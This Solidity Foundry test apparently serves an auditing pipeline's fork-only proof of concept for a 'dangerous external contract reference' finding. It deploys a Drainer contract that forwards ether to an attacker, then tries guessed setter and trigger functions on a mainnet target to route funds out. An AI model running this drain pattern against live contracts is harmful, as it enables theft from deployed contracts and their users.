// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Dangerous External Contract Reference
/// @notice Detector: external-contract-referencing. The target interacts with
///         an external contract that can be swapped or initialized dangerously,
///         allowing for reentrancy or state manipulation.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh.

/// Receives whatever the target forwards and passes it to the attacker. Used as
/// the attacker-controlled external reference.
contract Drainer {
    address payable public immutable sink;

    constructor(address payable sink_) {
        sink = sink_;
    }

    receive() external payable {
        sink.transfer(address(this).balance);
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    /// Set the target's external reference, then trigger the path that uses it.
    /// Success is the ATTACKER'S BALANCE RISING — value routed through our
    /// contract — never either call returning.
    function _setAndTrigger(
        address attacker,
        bytes memory setData,
        string memory setLabel,
        bytes memory trigData,
        string memory trigLabel
    ) internal returns (bool) {
        vm.prank(attacker);
        (bool setOk,) = target.call(setData);
        console.log("tried", setLabel, setOk ? "call returned" : "call reverted");
        if (!setOk) return false;

        uint256 before = attacker.balance;
        vm.prank(attacker);
        (bool trigOk,) = target.call(trigData);
        console.log("tried", trigLabel, trigOk ? "call returned" : "call reverted");
        return attacker.balance > before;
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);
        Drainer drainer = new Drainer(payable(attackerEOA));

        // Both halves are GUESSES on an unverified target: the setter that
        // takes an address, and the path that calls it.
        bool reproduced;
        if (!reproduced) reproduced = _setAndTrigger(attackerEOA, abi.encodeWithSignature("setTarget(address)", address(drainer)), "setTarget(address)", abi.encodeWithSignature("withdraw()"), "withdraw()");
        if (!reproduced) reproduced = _setAndTrigger(attackerEOA, abi.encodeWithSignature("setTarget(address)", address(drainer)), "setTarget(address)", abi.encodeWithSignature("execute()"), "execute()");
        if (!reproduced) reproduced = _setAndTrigger(attackerEOA, abi.encodeWithSignature("setTarget(address)", address(drainer)), "setTarget(address)", abi.encodeWithSignature("payout()"), "payout()");
        if (!reproduced) reproduced = _setAndTrigger(attackerEOA, abi.encodeWithSignature("set(address)", address(drainer)), "set(address)", abi.encodeWithSignature("withdraw()"), "withdraw()");
        if (!reproduced) reproduced = _setAndTrigger(attackerEOA, abi.encodeWithSignature("set(address)", address(drainer)), "set(address)", abi.encodeWithSignature("execute()"), "execute()");
        if (!reproduced) reproduced = _setAndTrigger(attackerEOA, abi.encodeWithSignature("set(address)", address(drainer)), "set(address)", abi.encodeWithSignature("payout()"), "payout()");
        if (!reproduced) reproduced = _setAndTrigger(attackerEOA, abi.encodeWithSignature("update(address)", address(drainer)), "update(address)", abi.encodeWithSignature("withdraw()"), "withdraw()");
        if (!reproduced) reproduced = _setAndTrigger(attackerEOA, abi.encodeWithSignature("update(address)", address(drainer)), "update(address)", abi.encodeWithSignature("execute()"), "execute()");
        if (!reproduced) reproduced = _setAndTrigger(attackerEOA, abi.encodeWithSignature("update(address)", address(drainer)), "update(address)", abi.encodeWithSignature("payout()"), "payout()");

        assertTrue(
            reproduced,
            "no settable external reference routed value to the attacker's contract. Tried setTarget(address), set(address), update(address), each with withdraw(), execute(), payout(). This does NOT establish safety: the setter or the trigger may be named differently, be guarded, or the target may hold nothing to route."
        );
    }
}
